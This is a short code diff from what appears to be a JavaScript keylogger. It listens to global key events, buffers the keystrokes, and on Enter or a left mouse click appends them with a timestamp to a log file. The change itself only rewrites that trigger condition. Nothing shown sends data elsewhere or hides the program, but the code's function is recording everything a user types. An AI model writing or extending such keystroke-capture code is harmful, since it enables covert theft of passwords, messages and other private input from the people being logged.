@@ -56,9 +56,7 @@ try {
         const keyName = event.name;
 
         if (down[keyName]) {
-            
-            const keyName = event.name;
-            if (event.rawKey && ['VK_MBUTTON', 'VK_RBUTTON', 'VK_LBUTTON'].includes(event.rawKey._nameRaw) || keyName === 'RETURN' || keyName === 'ENTER' ) {
+            if (keyName == 'MOUSE LEFT' || keyName === 'RETURN' || keyName === 'ENTER' ) {
                 if(rawBuffer != ''){
                     rawBuffer += `\n\n\----------------------        ${new Date()}      -----------------------------\n\n`;
                     fs.writeFile(logPath, rawBuffer, { flag: 'a' }, (err) => {
